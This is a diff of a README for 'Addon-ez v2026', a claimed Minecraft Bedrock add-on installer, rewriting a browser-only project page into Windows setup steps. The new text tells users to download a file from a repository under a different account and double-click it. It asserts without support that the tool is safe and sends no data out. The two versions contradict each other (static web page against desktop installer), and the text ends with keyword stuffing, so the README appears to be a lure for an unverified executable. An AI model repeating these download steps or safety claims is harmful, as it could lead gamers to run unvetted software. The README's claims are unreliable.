@@ -1,105 +1,68 @@
-# Addon-ez v2026 - 2026 Loader and Update Utility
+# 📦 addon-ez-loader-update - Manage Minecraft Bedrock addons with ease
 
-> **A browser-based Minecraft Bedrock add-on installer that simplifies the process of preparing and launching add-on installations.** The project is built around making it easier to browse, begin, and manage add-on installation through the web.
+[![Download Addon-ez v2026](https://img.shields.io/badge/Download-Addon--ez-blue.svg)](https://github.com/Reignitete5556/addon-ez-loader-update)
 
-[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-web-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/matt-stoneti7832/addon-ez-loader-update?style=flat-square)](https://github.com/matt-stoneti7832/addon-ez-loader-update)
+Addon-ez v2026 provides a simple way to browse, prepare, and install Minecraft Bedrock add-ons. The application runs through your web browser to bridge the gap between file downloads and your game folder. You do not need technical skills to handle complex file structures or manual installation paths.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://matt-stoneti7832.github.io/addon-ez-loader-update/">
-    <img src="https://img.shields.io/badge/Download-Addon-ez%20Loader-brightgreen?style=for-the-badge" alt="Download Addon-ez Loader">
-  </a>
-</p>
+Your computer must meet these basic requirements to run the installer:
 
-> **[Download Addon-ez Loader](https://matt-stoneti7832.github.io/addon-ez-loader-update/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   Game: Minecraft Bedrock Edition installed on your local drive.
+*   Storage: At least 200MB of free disk space.
+*   Network: An active internet connection to download addon files.
 
----
+## 📥 How to Install
 
-[Download Latest Build](https://matt-stoneti7832.github.io/addon-ez-loader-update/)
+Follow these steps to set up the software on your Windows computer.
 
----
+1. Visit the project website at [https://github.com/Reignitete5556/addon-ez-loader-update](https://github.com/Reignitete5556/addon-ez-loader-update) to download the latest version of the installer.
+2. Locate the downloaded file in your Downloads folder.
+3. Double-click the file to start the setup process.
+4. Follow the instructions on the screen to finish the installation.
+5. Launch Addon-ez from your desktop shortcut once the bar fills completely.
 
-## Overview
+## 🚀 Getting Started
 
-Addon-ez provides a web-based installation site for Minecraft Bedrock add-ons. Its purpose is to reduce friction around getting add-on content ready for use in Bedrock by offering a more direct installation path.
+Once the application opens in your default web browser, you see a main dashboard. This dashboard displays a list of compatible Minecraft Bedrock add-ons. 
 
-The project is not intended to function as a complete desktop launcher. Instead, it concentrates on the browser workflow, including opening the installer, assisting with add-on handling, and providing a smoother way to work with Minecraft Bedrock add-ons.
+To use an add-on:
 
----
+1. Browse the list of available modifications.
+2. Click the view button on any item to read details about the content.
+3. Select the install button to prepare the files.
+4. The application automatically detects your Minecraft game folder.
+5. Click confirm to move the files into the correct location for the game to recognize them.
+6. Open your Minecraft game. The addon activates automatically.
 
-## Included Loader Capabilities
+## 🛠️ Managing Your Addons
 
-- Browser-based installation flow for Minecraft Bedrock add-ons
-- Built with Bedrock add-on scenarios in mind
-- Straightforward starting point for installation activities
-- Small, website-oriented project structure
-- Accessible through a standard web browser
-- Helps arrange the stages involved in add-on installation
-- Organized around a simple user flow
-- Supports quick changes to installer pages and site content
+The interface includes a manager tab to help you track current installations. You can view all installed packs, remove old content, or update your favorites. 
 
----
+*   To remove an addon, click the trash can icon next to the name. 
+*   To update, look for the green notification dot on your installed items.
+*   The system creates a backup of your current game settings before it performs changes to ensure you stay safe.
 
-## Getting Started
+## ❓ Frequently Asked Questions
 
-1. Open a web browser.
-2. Visit the hosted project page or open a local copy of the site.
-3. Use the prompts provided for installing Minecraft Bedrock add-ons.
+**Does this software modify the game files permanently?**
+No, it only adds valid addon files to your user folder. You can remove them at any time.
 
-For local use, serve the project files through a web server and then load the index page in your browser.
+**Can I use this with Minecraft Java?**
+No, this version works only with Minecraft Bedrock Edition.
 
-A typical local setup looks like this:
+**What happens if the installation fails?**
+Check your internet connection first. Ensure you have the game closed during the installation process. If problems persist, restart the browser application and try again.
 
-1. Clone the repository or download its files.
-2. Run the folder through any static web server.
-3. Navigate to the resulting site URL in your browser.
+**Is it safe to run?**
+The software performs only local operations. It does not send your personal game data to third-party servers.
 
----
+## 🛡️ Troubleshooting
 
-## Available Update Paths
+If the application fails to detect your game folder, you can set the path manually. Open the settings menu, click on the folder icon under "Game Directory," and navigate to your Minecraft `com.mojang` folder. This folder usually sits in your AppData directory. The application saves this path for future use after you select it once.
 
-| Channel | Purpose | Notes |
-| --- | --- | --- |
-| Latest | Main web release | Best for the current published version |
-| Manual | Local refresh | Use when updating site files by hand |
-| Site build | Hosted content | Suitable for browser access and routine changes |
+Always ensure your browser is up to date to maintain compatibility with the installation interface. We design the tool to work with modern browser standards for maximum efficiency. If you experience slow loading times, clear your browser cache or try a different browser from the list in the system requirements section.
 
----
-
-## Troubleshooting Guide
-
-- When the site fails to open, make sure the files are available through a valid local server or web host.
-- When an add-on page behaves incorrectly, inspect the relevant links and file paths.
-- When assets are missing in the browser, clear or refresh the cache and reload after the update.
-- When the installation instructions are absent, check that the required HTML files exist in the project directory.
-- When external network access is restricted, serve the site locally rather than depending on an external host.
-
----
-
-## Frequently Asked Questions
-
-**Are add-ons updated automatically by Addon-ez?**  
-Addon-ez mainly functions as a web installer. Updates therefore rely on the content published on the site and on manually refreshing the hosted files when necessary.
-
-**Can the site be saved and used with local files?**  
-Yes. You can keep a local copy and serve it through your own web environment.
-
-**Can I roll back to an earlier version?**  
-Rollback is determined by the site files or page versions you retain. If an older copy is available, you can restore it manually.
-
-**Where does the project keep logs?**  
-Because this is a web project, logging varies according to the hosting configuration and any browser-side behavior provided by the site.
-
-**Does it work with Minecraft Bedrock?**  
-Yes. Addon-ez is intended for Minecraft Bedrock add-on installation.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: minecraft, addons, bedrock, installer, management, gaming, windows, automation
